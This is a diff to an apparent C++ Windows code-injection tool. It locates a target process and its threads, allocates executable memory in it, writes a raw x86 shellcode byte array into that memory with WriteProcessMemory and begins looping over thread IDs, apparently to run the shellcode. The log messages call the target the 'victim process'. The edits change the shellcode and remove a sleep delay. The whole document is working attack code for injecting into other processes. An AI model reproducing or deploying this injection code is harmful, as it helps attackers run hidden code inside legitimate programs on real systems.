@@ -9,7 +9,9 @@
 
 using namespace std;
 
-byte executer[] = {"\x55\x89\xE5\x83\xEC\x0C\xC6\x45\xFC\x48\xC6\x45\xFD\x00\xC6\x45\xF8\x46\xC6\x45\xF9\x00\x8B\x45\x08\x8B\x08\x89\x4D\xF4\x50\x6A\x00\x8D\x45\xFC\x50\x8D\x45\xF8\x50\x6A\x00\xFF\x55\x08\x83\xC4\x10\x58\x31\xC0\x89\xEC\x5D\xC3"};
+byte executer[] = {
+"\x55\x89\xE5\x83\xEC\x08\xC6\x45\xFC\x48\xC6\x45\xFD\x00\xC6\x45\xF8\x46\xC6\x45\xF9\x00\x50\x6A\x00\x8D\x45\xFC\x50\x8D\x45\xF8\x50\x6A\x00\xFF\x55\x08\x58\x89\xEC\x5D\xC3"
+};
 
 bool FindProcess(const char* exeName, DWORD& pid, vector<DWORD>& tids) {
     auto hSnapshot = ::CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS | TH32CS_SNAPTHREAD, 0);
@@ -54,14 +56,12 @@ void main()
 			cout<<"[!] failed to get handle for process: "<<pid<<endl;
 			return;
 		}
-		// auto p = ::VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
 		auto p = ::VirtualAllocEx(hProcess, nullptr, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
 		if(p==NULL) {
 			cout<<"[!] memory allocation failed!"<<endl;
 			return ;
 		}else{cout<<"[+] virtual mem allocation success"<<endl;}
 		unsigned long injectedFn = (unsigned long)p;
-		// injectedFn = injectedFn+0x14;
 		cout<<"[i] allocated memory address: 0x"<<hex<<injectedFn<<dec<<endl;
 
 		if(::WriteProcessMemory(hProcess, p, exe, size, nullptr)==0){
@@ -69,8 +69,8 @@ void main()
 			cout<<"[!] write to victim process memory failed with error: "<<dec<<err<<endl;
 			return ;
 		}else{cout<<"[+] write to process success"<<endl;}
-		cout<<"[+] Sleeping for 11s"<<endl;
-		Sleep(11000);
+		// cout<<"[+] Sleeping for 5s"<<endl;
+		// Sleep(5000);
 
 		for(vector<DWORD>::size_type i = 0; i != tids.size() && i<4; i++) {
 			DWORD tid = tids[i];
